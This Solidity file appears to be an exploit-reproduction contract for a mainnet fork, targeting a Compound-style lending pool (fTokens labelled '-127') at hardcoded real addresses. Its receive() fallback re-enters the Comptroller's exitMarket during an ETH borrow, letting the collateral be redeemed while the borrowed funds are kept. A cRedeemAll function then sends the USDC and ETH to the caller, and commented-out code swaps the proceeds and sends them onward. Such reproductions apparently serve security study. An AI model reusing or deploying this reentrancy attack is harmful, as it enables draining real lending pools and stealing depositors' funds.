// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

// // import "forge-std/Test.sol";
// import "forge-std/console.sol";

import "../HarvestFF/interfaces/IFlashLoanReceiver.sol";
import "../HarvestFF/interfaces/ILendingPool.sol";
import "../HarvestFF/interfaces/ILendingPoolAddressesProvider.sol";
import "../HarvestFF/interfaces/IERC20.sol";
import "../HarvestFF/interfaces/IUniswapV2Router02.sol";

import "./interfaces/CErc20Interface.sol";
import "./interfaces/ComptrollerInterface.sol";

// fork_block_number = 14684685
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}
interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IWETH {
    function transfer(address to, uint value) external returns (bool);
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IFETH {
    function mint() external payable;
    function getCash() external view returns (uint);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function redeem(uint redeemTokens) external returns (uint);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

interface IVault {
    function flashLoan(
        address receiver,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract Convert {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ComptrollerInterface unitroller = ComptrollerInterface(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F); // Unitroller
    
    CErc20Interface fUSDC = CErc20Interface(payable(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47));   // 0xb1&#39;s Kitchen Sink USD Co... (fUSDC-127)
    CErc20Interface fUSDT = CErc20Interface(payable(0xe097783483D1b7527152eF8B150B99B9B2700c8d));   // fUSDT-127
    CErc20Interface fETH = CErc20Interface(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));    // fETH-127
    CErc20Interface fFRAX = CErc20Interface(payable(0x8922C1147E141C055fdDfc0ED5a119f3378c8ef8));   // fFRAX-127
    CErc20Interface[] fTokens = [fUSDC, fUSDT, fETH, fFRAX];

    CErc20Interface fDAI = CErc20Interface(payable(0x7e9cE3CAa9910cc048590801e64174957Ed41d43));    // party time check

    IUniswapV2Router uniswap = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // balancer protocol flash loan check
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);

    // balancer check
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; 
    IVault balancerVault = IVault(BALANCER_VAULT);

    address me;
    address ca;
    address oca;
    // FxToken Address
    address fTokenCache;
    uint256 mintTokenCache;

    uint256[] balances = new uint256[](3);
    IERC20[] public tokens = [USDT, USDC, FRAX];

    IUniswapV2Router uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    constructor() {}

    receive () external payable {
        // exitMarket
        unitroller.exitMarket(fTokenCache);
        
    }   
    
    function bootLoad(address fToken) external {
        // emit log_string("bootLoad");
        fTokenCache = fToken;
        address[] memory em = new address[](1);
        em[0] = fToken;
        unitroller.enterMarkets(em);
    }

    function cMint() external {
        // emit log_string("cMint");
        USDC.approve(fTokenCache, ~uint256(0));
        uint _usdcBalance = USDC.balanceOf(address(this));
        CErc20Interface(fTokenCache).mint(_usdcBalance);
        mintTokenCache = _usdcBalance;
    }

    function cBorrow(uint cBorrow) external {
        // emit log_string("cBorrow");
        CErc20Interface(fTokenCache).borrow(cBorrow);
    }

    function cRedeemAll() external {
        // emit log_string("cRedeemAll");
        CErc20Interface(fTokenCache).approve(fTokenCache, ~uint256(0));
        CErc20Interface(fTokenCache).redeemUnderlying(mintTokenCache);

        uint256 new_usdcBalance = USDC.balanceOf(address(this));
        // emit log_named_uint("new_usdcBalance", new_usdcBalance);
        // emit log_named_uint("new_ETH", address(this).balance);
        USDC.transfer(msg.sender, new_usdcBalance);
        payable(msg.sender).transfer(address(this).balance);
    }

    // function run() public {
    //     // emit log_named_address("tx.origin", address(tx.origin));
    //     // emit log_named_uint("OCA: USDC balance", USDC.balanceOf(address(this)));
    //     // emit log_named_uint("OCA: ETH balance", address((this)).balance);
    //     // emit log_named_uint("OCA: USDT balance", USDT.balanceOf(address(this)));
    //     // emit log_named_uint("OCA: FRAX balance", FRAX.balanceOf(address(this)));
    //     // emit log_named_uint("OCA: WETH balance", WETH.balanceOf(address(this)));

    //     for (uint i = 0; i < tokens.length; i++) {
    //         balances[i] = tokens[i].balanceOf(address(this));
    //         uniswapSwap(balances[i], tokens[i]);
    //         // emit log_named_uint("OCA: WETH balance", WETH.balanceOf(address(this)));
    //     }
    //     // uniswapSwap(_amountIn, _tokens);
    //     IWETH(address(WETH)).withdraw(IWETH(address(WETH)).balanceOf(address(this)));
    //     payable(tx.origin).transfer(address(this).balance);
    //     // emit log_named_uint("OCA: ETH balance", address((this)).balance);   
    // }

    function uniswapSwap(uint256 _amountIn, IERC20 _tokens) internal {
        // Approve transfer of USDC token to uniswapRouter
        _tokens.approve(address(uniswapRouter), _amountIn);
        _tokens.approve(address(this), _amountIn);

        // Get current reserves of the USDC-WMATIC
        // (uint256 reserveUSDC, uint256 reserveWETH, ) = pair.getReserves();

        // Calculate the amount of WETH to receive
        // uint256 amountOut = uniswapRouter.getAmountOut(_amountIn, reserveUSDC, reserveWETH);

        address[] memory path = new address[](2);
        path[0] = address(_tokens);
        path[1] = address(WETH);
        uniswapRouter.swapExactTokensForTokens(_amountIn, 0, path, address(this), block.timestamp);
    }
    // FRAX-WETH
    // USDT-WETH
    // USDC-WETH
}